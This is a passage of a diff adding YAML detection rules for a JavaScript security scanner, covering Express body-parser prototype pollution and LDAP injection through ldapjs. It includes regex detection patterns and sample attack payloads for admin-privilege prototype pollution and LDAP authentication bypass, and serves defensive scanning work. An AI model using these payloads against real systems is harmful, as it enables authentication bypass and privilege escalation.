+      - Use express-mongo-sanitize to prevent operator injection.
+    references:
+      - "https://expressjs.com/en/api.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]express[\x27"]\s*\)', 'app\.use']
+      taint_source_indicators: ['req\.body']
+      taint_sink_indicators: ['\.find\s*\(', 'Object\.assign', '\.merge\s*\(']
+      sanitization_patterns: ['extended.*false', 'express-mongo-sanitize', 'type.*application/json']
+    severity_scoring:
+      severity_weight: 6
+      risk_score_formula_hint: "severity_weight * confidence * (1 - config_hardening)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An Express app uses bodyParser.urlencoded({extended:true}). An attacker
+        sends user[__proto__][isAdmin]=true in the URL-encoded body to pollute
+        Object.prototype and gain admin access.
+      example_payload: "user[__proto__][isAdmin]=true&user[__proto__][role]=admin"
+      attacker_objective: "Exploit body parser configuration for prototype pollution or type confusion"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "medium"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: false
+      related_rules: [JS-INJ-008, JS-INJ-010]
+
+  # ==========================================================================
+  # JS-INJ-015: LDAP Injection via ldapjs
+  # ==========================================================================
+  - rule_id: JS-INJ-015
+    title: LDAP Injection via ldapjs
+    description: >
+      Detects LDAP injection vulnerabilities in Node.js applications using
+      ldapjs or similar LDAP client libraries where user-controlled input is
+      interpolated into LDAP filter strings without sanitization.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.89
+    cwe: CWE-90
+    owasp: "A03:2021-Injection"
+    tags: [ldap-injection, ldapjs, directory-service, authentication-bypass]
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '\.search\s*\(\s*[^,]+,\s*\{[^}]*filter\s*:\s*[`][^`]*\$\{[^}]*(?:req|input|user|username|name)[^}]*\}'
+        description: "LDAP search with template literal filter containing user input"
+      - type: regex
+        pattern: '\.search\s*\(\s*[^,]+,\s*\{[^}]*filter\s*:\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|username)'
+        description: "LDAP search with concatenated filter"
+      - type: regex
+        pattern: 'ldap\.(?:search|bind|modify|compare)\s*\(\s*[^,]*(?:req\.|input|user|username|dn)\.'
+        description: "LDAP operation with user-controlled DN or filter"
+      - type: regex
+        pattern: '(?:parseDN|parseFilter)\s*\(\s*(?:req\.|input|user|username)'
+        description: "LDAP DN/filter parsing with user input"
+    anti_patterns:
+      - 'ldap\.escape\s*\('
+      - 'escapeLDAPFilter\s*\('
+      - 'sanitize\s*\('
+      - 'Filter\.(?:EqualityFilter|SubstringFilter|PresenceFilter)'
+      - 'test\s*\('
+      - 'ldap\.parseFilter\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
+    bypass_variants:
+      - description: "LDAP filter injection via wildcard"
+        pattern: '\*\)\(\|?\(\w+=\*'
+      - description: "LDAP injection with OR operator"
+        pattern: '\)\(|\|?\(\w+=\*\)'
+    evasion_indicators:
+      - "LDAP metacharacter injection (*, (), |, &)"
+      - "DN injection via unescaped commas"
+    encoding_variants:
+      - type: "hex_ldap"
+        pattern: '\\[0-9a-fA-F]{2}'
+    multi_function_chain_patterns:
+      - "req.body.username -> filter: `(uid=${username})` -> ldap.search"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "LDAP injection enables authentication bypass and directory data exfiltration"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.username"
+        sink: "ldap.search(filter)"
+        through: "template literal or string concatenation"
+    impact: |
+      LDAP injection allows attackers to bypass authentication, enumerate
+      directory users, extract sensitive attributes, and modify directory entries.
+    remediation: |
+      - Use LDAP filter escaping functions for user input.
+      - Use ldapjs Filter objects instead of string filters.
+      - Validate input against strict character allowlists.
+      - Use parameterized LDAP queries where available.
+    references:
+      - "https://cwe.mitre.org/data/definitions/90.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ldapjs[\x27"]\s*\)', 'createClient']
+      taint_source_indicators: ['req\.body\.username', 'req\.body\.password', 'req\.query\.user']
+      taint_sink_indicators: ['\.search\s*\(', '\.bind\s*\(', 'filter\s*:']
+      sanitization_patterns: ['ldap\.escape', 'escapeLDAPFilter', 'Filter\.EqualityFilter']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A login function uses ldap.search with filter: `(&(uid=${username})(userPassword=${password}))`.
+        Attacker sends username=*)(uid=*))(|(uid=* to bypass authentication and enumerate users.
+      example_payload: "*)(uid=*))(|(uid=*"
+      attacker_objective: "Bypass LDAP authentication or enumerate directory entries"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-006, JS-INJ-010]
